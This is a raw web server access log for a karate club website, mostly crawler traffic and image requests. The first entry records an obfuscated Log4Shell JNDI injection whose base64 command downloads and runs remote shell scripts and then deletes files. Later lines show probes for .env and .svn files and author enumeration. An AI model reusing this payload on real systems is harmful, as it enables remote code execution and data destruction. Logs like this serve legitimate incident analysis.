::ffff:167.99.144.251 - - [19/Nov/2022:00:01:03 +0000] "GET /:80:undefined?id= HTTP/1.1" 404 152 "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//137.184.207.85:1389/WebsphereBypass/Upload/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9odWguc2g7IGN1cmwgLU8gaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9odWguc2g7IGNobW9kIDc3NyBodWguc2g7IHNoIGh1aC5zaDsgdGZ0cCAxOTEuMjM0LjIwMC4yMTYgLWMgZ2V0IGh1aC5zaDsgY2htb2QgNzc3IGh1aC5zaDsgc2ggaHVoLnNoOyB0ZnRwIC1yIGh1aDIuc2ggLWcgMTkxLjIzNC4yMDAuMjE2OyBjaG1vZCA3NzcgaHVoMi5zaDsgc2ggaHVoMi5zaDsgZnRwZ2V0IC12IC11IGFub255bW91cyAtcCBhbm9ueW1vdXMgLVAgMjEgMTkxLjIzNC4yMDAuMjE2IGh1aDEuc2ggaHVoMS5zaDsgc2ggaHVoMS5zaDsgcm0gLXJmIGh1aC5zaCBodWguc2ggaHVoMi5zaCBodWgxLnNoOyBybSAtcmYgKg==}')" "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//137.184.207.85:1389/WebsphereBypass/Upload/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9odWguc2g7IGN1cmwgLU8gaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9odWguc2g7IGNobW9kIDc3NyBodWguc2g7IHNoIGh1aC5zaDsgdGZ0cCAxOTEuMjM0LjIwMC4yMTYgLWMgZ2V0IGh1aC5zaDsgY2htb2QgNzc3IGh1aC5zaDsgc2ggaHVoLnNoOyB0ZnRwIC1yIGh1aDIuc2ggLWcgMTkxLjIzNC4yMDAuMjE2OyBjaG1vZCA3NzcgaHVoMi5zaDsgc2ggaHVoMi5zaDsgZnRwZ2V0IC12IC11IGFub255bW91cyAtcCBhbm9ueW1vdXMgLVAgMjEgMTkxLjIzNC4yMDAuMjE2IGh1aDEuc2ggaHVoMS5zaDsgc2ggaHVoMS5zaDsgcm0gLXJmIGh1aC5zaCBodWguc2ggaHVoMi5zaCBodWgxLnNoOyBybSAtcmYgKg==}')"
::ffff:42.193.21.12 - - [19/Nov/2022:00:32:45 +0000] "GET /?author=13 HTTP/1.1" 200 58140 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:42.193.21.12 - - [19/Nov/2022:00:32:48 +0000] "GET /?author=14 HTTP/1.1" 200 58140 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:42.193.21.12 - - [19/Nov/2022:00:32:53 +0000] "GET /?author=15 HTTP/1.1" 200 58140 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:42.193.21.12 - - [19/Nov/2022:00:32:55 +0000] "GET /?author=16 HTTP/1.1" 200 58140 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:42.193.21.12 - - [19/Nov/2022:00:32:56 +0000] "GET /?author=17 HTTP/1.1" 200 58140 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:42.193.21.12 - - [19/Nov/2022:00:32:57 +0000] "GET /?author=18 HTTP/1.1" 200 58140 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:42.193.21.12 - - [19/Nov/2022:00:32:57 +0000] "GET /?author=19 HTTP/1.1" 200 58140 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:42.193.21.12 - - [19/Nov/2022:00:32:58 +0000] "GET /?author=20 HTTP/1.1" 200 58140 "-" "Apache-HttpClient/4.5.2 (Java/1.8.0_151)"
::ffff:203.10.99.204 - - [19/Nov/2022:00:38:09 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:203.10.99.204 - - [19/Nov/2022:00:44:17 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:185.215.60.142 - - [19/Nov/2022:00:45:17 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:203.10.99.204 - - [19/Nov/2022:00:53:17 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:185.191.171.44 - - [19/Nov/2022:00:57:08 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.19 - - [19/Nov/2022:00:57:08 +0000] "GET /joinemail?type=blackbeltclasses HTTP/1.1" 200 8998 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:203.10.99.204 - - [19/Nov/2022:01:11:17 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:192.241.204.141 - - [19/Nov/2022:01:12:49 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:37.139.53.82 - - [19/Nov/2022:01:12:50 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [19/Nov/2022:01:12:50 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [19/Nov/2022:01:12:51 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:103.149.192.147 - - [19/Nov/2022:01:13:12 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:203.10.99.204 - - [19/Nov/2022:01:20:17 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:54.164.166.125 - - [19/Nov/2022:01:22:01 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::ffff:157.55.39.153 - - [19/Nov/2022:01:35:50 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.245.127.101 - - [19/Nov/2022:02:01:34 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
::ffff:157.245.127.101 - - [19/Nov/2022:02:01:34 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "https://34.212.47.6/" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
::ffff:135.125.244.48 - - [19/Nov/2022:02:15:52 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [19/Nov/2022:02:15:52 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.152.130 - - [19/Nov/2022:02:15:54 +0000] "GET /docs/Twenty%20guiding%20principles%20of%20Karate.pdf HTTP/1.1" 200 49483 "https://wadokikai.org/resources" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:109.237.98.53 - - [19/Nov/2022:02:19:34 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:109.237.98.53 - - [19/Nov/2022:02:19:34 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:203.10.99.204 - - [19/Nov/2022:02:32:17 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:188.213.26.125 - - [19/Nov/2022:02:37:37 +0000] "GET /.svn/wc.db HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4889.0 Safari/537.36"
::ffff:203.10.99.204 - - [19/Nov/2022:02:41:17 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:114.119.152.108 - - [19/Nov/2022:02:42:54 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:203.10.99.204 - - [19/Nov/2022:02:59:17 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:203.10.99.204 - - [19/Nov/2022:03:08:17 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:128.1.248.26 - - [19/Nov/2022:03:27:54 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:68.218.40.11 - - [19/Nov/2022:03:30:59 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:68.218.40.11 - - [19/Nov/2022:03:30:59 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:68.218.40.11 - - [19/Nov/2022:03:31:00 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:68.218.40.11 - - [19/Nov/2022:03:31:00 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
::ffff:157.55.39.169 - - [19/Nov/2022:03:33:51 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.169 - - [19/Nov/2022:03:33:51 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.153 - - [19/Nov/2022:03:34:02 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:157.55.39.159 - - [19/Nov/2022:03:34:21 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.159 - - [19/Nov/2022:03:34:21 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:203.10.99.204 - - [19/Nov/2022:03:36:00 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:203.10.99.204 - - [19/Nov/2022:03:41:29 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:205.210.31.20 - - [19/Nov/2022:03:48:57 +0000] "GET / HTTP/1.1" 200 58140 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:203.10.99.204 - - [19/Nov/2022:03:49:13 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:77.88.5.134 - - [19/Nov/2022:03:49:57 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:77.88.5.134 - - [19/Nov/2022:03:50:00 +0000] "GET /terminology.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:185.191.171.3 - - [19/Nov/2022:03:50:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.23 - - [19/Nov/2022:03:50:16 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:114.119.146.141 - - [19/Nov/2022:03:51:51 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:203.10.99.204 - - [19/Nov/2022:03:54:40 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
